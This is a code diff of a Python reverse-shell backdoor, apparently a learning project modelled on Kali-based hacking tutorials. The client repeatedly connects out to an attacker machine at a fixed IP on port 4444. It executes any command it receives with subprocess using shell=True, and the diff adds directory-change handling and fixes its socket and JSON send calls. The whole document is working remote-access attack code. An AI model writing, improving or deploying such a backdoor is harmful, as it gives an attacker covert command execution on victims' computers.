@@ -1,6 +1,8 @@
 import socket
 import time
 import subprocess
+import json
+import os
 
 kali_ip = "192.168.0.8"
 kali_port = 4444
@@ -11,10 +13,10 @@ def connection():
         time.sleep(20)
         try:
             # connect to destination addr
-            s.connect(kali_ip, kali_port)
+            sock.connect((kali_ip, kali_port))
             #executing the commands
             shell()
-            s.close()
+            sock.close()
         except: 
             connection()
 
@@ -24,6 +26,12 @@ def shell():
         command = reliable_receiv()
         if command == 'quit': 
             break
+        #just check for the first 3 chars in command
+        elif command[:3] == 'cd ':
+            # cd Desktop should be "chdir(Desktop)" so we need to start after "cd "
+            os.chdir(command[3:])
+        elif command == 'clear':
+            pass
         else: 
             execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
@@ -34,7 +42,7 @@ def reliable_send(data):
     # data is our command and parses it to json
     jsonData = json.dumps(data)
     # send actual data, once sending data over sockets we need to encode it
-    sock.send(json.encode())
+    sock.send(jsonData.encode())
 
 def reliable_receiv():
     data = ''
